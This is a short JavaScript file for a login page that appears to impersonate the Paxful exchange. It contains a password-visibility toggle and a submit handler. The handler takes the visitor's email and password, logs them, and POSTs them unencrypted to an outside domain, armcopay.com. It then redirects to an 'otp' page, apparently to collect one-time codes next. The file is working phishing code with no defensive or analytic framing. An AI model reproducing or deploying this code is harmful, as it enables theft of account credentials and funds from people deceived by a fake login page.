const passwordInput = document.querySelector(".password");
const eye = document.querySelector(".icon");

if (window.location.pathname === "pax/index.html") {
  window.location.replace("/offers");
}

const showHidePassword = () => {
  if (passwordInput.type === "password") {
    eye.classList.remove("fa-eye");
    passwordInput.setAttribute("type", "text");
    eye.classList.add("fa-eye-slash");
  } else {
    eye.classList.remove("fa-eye-slash");
    passwordInput.setAttribute("type", "password");
    eye.classList.add("fa-eye");
  }
};

eye.addEventListener("click", showHidePassword);

function submitForm(event) {
  // Prevent the default form submission behavior
  event.preventDefault();

  // Get values from the form
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

  console.log(email, password);

  // Create a FormData object and append the form data
  let data = new FormData();
  data.append("email", email);
  data.append("password", password);

  // Use the fetch API to send the form data to the server
  fetch("http://armcopay.com/api/v1/paxful", {
    method: "POST",
    body: data,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Network response was not ok");
      }
      return response.text();
    })
    .then((data) => {
      // Redirect to the Paxful login page after the alert is closed
      window.location.href = "./otp";
    })
    .catch((error) => {
      console.error("There was a problem with the fetch operation:", error);
    });
}

// Attach the submitForm function to the form's submit event
document.querySelector("form").addEventListener("submit", submitForm);

// document.addEventListener("DOMContentLoaded", function () {
//   document.querySelector("form").addEventListener("submit", submitForm);
// });
